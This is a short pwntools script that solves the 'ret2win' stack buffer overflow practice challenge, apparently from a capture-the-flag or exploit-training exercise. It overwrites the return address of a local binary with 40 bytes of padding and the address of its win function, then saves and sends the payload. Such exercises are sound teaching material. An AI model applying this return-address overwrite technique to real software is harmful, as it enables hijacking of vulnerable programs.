from pwn import *
context.update(arch='amd64', os='linux')

binary = './ret2win'
elf = ELF(binary)

win = elf.functions['ret2win'].address

padding=40

with open('solve.txt', 'w') as f:
    f.write(cyclic(padding))
    f.write(p64(win))

p = process(binary)
p.send(cyclic(padding) + p64(win))
p.interactive()
